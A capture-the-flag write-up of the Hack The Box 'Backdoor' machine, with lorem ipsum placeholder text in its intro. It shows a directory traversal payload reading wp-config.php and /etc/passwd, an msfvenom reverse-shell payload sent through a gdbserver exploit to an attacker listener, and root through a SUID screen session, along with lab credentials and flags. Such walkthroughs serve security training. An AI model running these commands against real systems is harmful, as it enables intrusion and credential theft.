---
layout: single
title: Backdoor - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-11-23
classes: wide
header:
  teaser: /assets/images/htb-writeup-backdoor/backdoor_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-backdoor/backdoor_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
<br>

----------------

# USER

### Step 1

**nmap:**
```bash
┌──(void㉿void)-[/htb/backdoor]
└─$ nmap -Pn -n -sCV 10.129.108.149  
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**dirb:**
```bash
+ http://10.129.108.149/index.php (CODE:301|SIZE:0)
+ http://10.129.108.149/server-status (CODE:403|SIZE:279)
+ http://10.129.108.149/xmlrpc.php (CODE:405|SIZE:42)                             
+ http://10.129.108.149/wp-admin/admin.php (CODE:302|SIZE:0)                       
+ http://10.129.108.149/wp-admin/index.php (CODE:302|SIZE:0)
+ http://10.129.108.149/wp-content/index.php (CODE:200|SIZE:0)
+ http://10.129.108.149/wp-admin/network/admin.php (CODE:302|SIZE:0)
+ http://10.129.108.149/wp-admin/network/index.php (CODE:302|SIZE:0)               
+ http://10.129.108.149/wp-admin/user/admin.php (CODE:302|SIZE:0)
+ http://10.129.108.149/wp-admin/user/index.php (CODE:302|SIZE:0)

==> DIRECTORY: http://10.129.108.149/wp-admin/css/
==> DIRECTORY: http://10.129.108.149/wp-admin/images/
==> DIRECTORY: http://10.129.108.149/wp-admin/includes/
==> DIRECTORY: http://10.129.108.149/wp-admin/js/
==> DIRECTORY: http://10.129.108.149/wp-admin/maint/
==> DIRECTORY: http://10.129.108.149/wp-admin/network/
==> DIRECTORY: http://10.129.108.149/wp-admin/user/
==> DIRECTORY: http://10.129.108.149/wp-content/plugins/
==> DIRECTORY: http://10.129.108.149/wp-content/themes/
==> DIRECTORY: http://10.129.108.149/wp-content/upgrade/
==> DIRECTORY: http://10.129.108.149/wp-content/uploads/  
```

**nikto:**
```bash
+ Server: Apache/2.4.41 (Ubuntu)
+ Uncommon header 'link' found, with multiple values: (<http://10.129.108.149/index.php/wp-json/>; rel="https://api.w.org/",<http://10.129.108.149/index.php/wp-json/wp/v2/pages/11>; rel="alternate"; type="application/json",<http://10.129.108.149/>; rel=shortlink,)
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Uncommon header 'x-redirect-by' found, with contents: WordPress
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information
+ /wp-login.php: Wordpress login found
```

**wpscan:**
```bash
┌──(void㉿void)-[/htb/backdoor]
└─$ wpscan --url http://backdoor.htb/ --enumerate ap
[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://backdoor.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://backdoor.htb/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://backdoor.htb/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://backdoor.htb/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8.1 identified (Latest, released on 2021-09-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://backdoor.htb/index.php/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
 |  - http://backdoor.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://backdoor.htb/wp-content/themes/twentyseventeen/
 | Latest Version: 2.8 (up to date)
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://backdoor.htb/wp-content/themes/twentyseventeen/readme.txt
 | Style URL: http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://backdoor.htb/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.
```

- **WP Version: 5.8.1**
- **No plugins (according to wpscan)**

Looking through the directories manually we can see that wpscan didn't really do it's job as there is a plugin, ebook download, in http://10.129.108.149/wp-content/plugins/. Looking in the `readme.txt` it seems like it's running version 1.1.

A quick google about the plugin and we find a directory traversal vulnerability.
`10.129.108.149/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php`

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

-----

<br>

### Step 2
Use the path traversal to find username;
http://10.129.108.149/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd

We are unable to extract `/home/user/user.txt` and/or `/home/user/.ssh/id_rsa`, but we can verify that we are in the correct directory by extracting `/home/user/.bashrc`.

Running my lfi-list and looking on `/proc/sched_debug` we can see all locally running services with their PID's. Among them I find `gdbserver` on PID `40276`. Investigating the pid in question with `/proc/40276/cmdline` we get the following output:
`gdbserver --once 0.0.0.0:1337`

Verifying with nmap we see that I missed port 1337.
```bash
$ nmap -p 1337 10.129.108.149     
PORT     STATE SERVICE
1337/tcp open  waste
```

-----

<br>

### Step 3
Exploit gdbserver with found [script](https://www.exploit-db.com/exploits/50539).
```bash
┌──(void㉿void)-[/htb/backdoor]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.30 LPORT=4488 PrependFork=true -o rev.bin
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Saved as: rev.bin

┌──(void㉿void)-[/htb/backdoor]
└─$ python3 gdb-expl.py 10.129.108.149:1337 rev.bin
[+] Connected to target. Preparing exploit
[+] Found x64 arch
[+] Sending payload
[*] Pwned!! Check your listener

┌──(void㉿void)-[/htb/backdoor]
└─$ nc -lvnp 4488             
listening on [any] 4488 ...
connect to [10.10.14.30] from (UNKNOWN) [10.129.108.149] 50400
id && hostname
uid=1000(user) gid=1000(user) groups=1000(user)
Backdoor
cat user.txt
d41625febafce97713402b47d1044f48
```



-------------

<br>

# ROOT

### Step 1
From our LFI we were able to extract the wordpress database information, lets start by looking around there.

```mysql
user@Backdoor:/home/user$ mysql wordpress -u wordpressuser -p
Enter password: MQYBJSaD#DxG6qbm
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
+--------------------+
2 rows in set (0.00 sec)

mysql> use wordpress;
Database changed
mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url            | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$Bt8c3ivanSGd2TFcm3HV/9ezXPueg5. | admin         | admin@wordpress.com | http://backdoor.htb | 2021-07-24 13:19:11 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+---------------------+-------------+--------------+



```

Saving the WordPress (MD5) hash to a file and trying to crack it with rockyou.txt fails, so I assume this is not the intended path. 

----

<br>

### Step 2

Instead upload `linpeas.sh` and run. From it we find a interesting process running as root:
`root         955  0.0  0.0   2608  1800 ?        Ss   04:27   0:07      _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done`

The script will start a screen with the name `<pid>.root` as root.
Running `ps aux` we can see pid 1017 for the active screen, meaning the name is `1017.root`.

```bash
user@Backdoor:/tmp$ ps aux | grep root
[... snip ...]
root        1017  0.0  0.1   6952  2504 ?        Ss   04:27   0:00 SCREEN -dmS root
```

Screen has the SUID bit set, which is mostly done for screen sharing.
```bash
user@Backdoor:/tmp$ ls -al $(which screen)
-rwsr-xr-x 1 root root 474280 Feb 23  2021 /usr/bin/screen
```

Attach the root screen (`1017.root`) and grab the flag.

```bash
user@Backdoor:/tmp$ screen -x root/1017.root
root@Backdoor:~$ id
uid=0(root) gid=0(root) groups=0(root)
root@Backdoor:~# cat root.txt 
ebd680a7fc4ffa43b442fa64cb2e8644
```


------

# References
**wordpress ebook download:**
https://www.exploit-db.com/exploits/39575

**gdbserver rce:**
https://www.exploit-db.com/exploits/50539

**screen session sharing:**
https://wiki.networksecuritytoolkit.org/index.php/HowTo_Share_A_Terminal_Session_Using_Screen